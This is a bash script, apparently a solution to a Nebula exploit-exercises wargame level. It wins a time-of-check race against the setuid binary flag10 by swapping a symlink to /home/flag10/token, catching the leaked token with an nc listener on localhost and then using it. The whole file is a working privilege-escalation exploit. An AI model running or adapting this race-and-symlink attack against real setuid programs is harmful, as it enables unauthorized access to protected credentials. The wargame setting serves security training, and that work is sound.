#!/bin/bash -eu
# Copyright (c) 2015, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/setup-exploit

HITHERE=".oO Oo."
HOST=127.0.0.1
PORT=18211
TOKEN_SYMLINK=$(mktemp)
PIDS=""

TOKEN=$(mktemp)
registerTrap "rm $TOKEN" EXIT

cleanup() {
  rm -f $TOKEN_SYMLINK
  kill -9 $PIDS 2>/dev/null >/dev/null || true
  PIDS=""
}
trap "cleanup" EXIT

echo "Trying to get the timing right, this might take a minute or two..."
for I in $(seq -w 1 1000)
do
  SLEEP=.00$I
  touch $TOKEN_SYMLINK
  nc -l -w 1 localhost 18211 &
  PIDS="$PIDS $!"
  /home/flag10/flag10 $TOKEN_SYMLINK $HOST >/dev/null || true &
  PIDS="$PIDS $!"
  sleep $SLEEP
  ln -sf /home/flag10/token $TOKEN_SYMLINK
  sleep 0.01
  cleanup
  while netstat -l | grep $PORT >/dev/null
  do
    sleep 0.001
  done
  if [ -s $TOKEN ]
  then
    break
  fi
done 2>/dev/null | grep -v "$HITHERE" | head -1 > $TOKEN

exploit_with_token $(cat $TOKEN)
